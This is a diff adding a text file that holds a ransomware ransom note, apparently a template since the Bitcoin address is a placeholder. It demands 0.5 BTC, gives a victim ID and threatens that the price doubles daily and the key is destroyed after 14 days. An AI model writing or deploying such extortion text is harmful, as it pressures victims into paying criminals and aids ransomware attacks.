@@ -1,0 +1,21 @@
+
+============================================
+       YOUR FILES HAVE BEEN ENCRYPTED
+============================================
+
+All your documents, photos and databases have been encrypted
+with 256-bit keys. The decryption key exists in exactly one
+place: our server.
+
+HOW TO GET YOUR FILES BACK
+  1. Send 0.5 BTC to: bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+  2. Include this victim ID in the subject: dIqWflLN1AOUkAkz
+  3. You will receive your recovery key within 1 hour.
+
+  - The price doubles every 24 hours.
+  - After 14 days the key is permanently destroyed.
+  - Do NOT rename, move, or delete the .r0x files.
+  - Ignore anyone who promises free decryptors. We have a copy
+    of everything. We always do.
+
+Victim ID: dIqWflLN1AOUkAkz
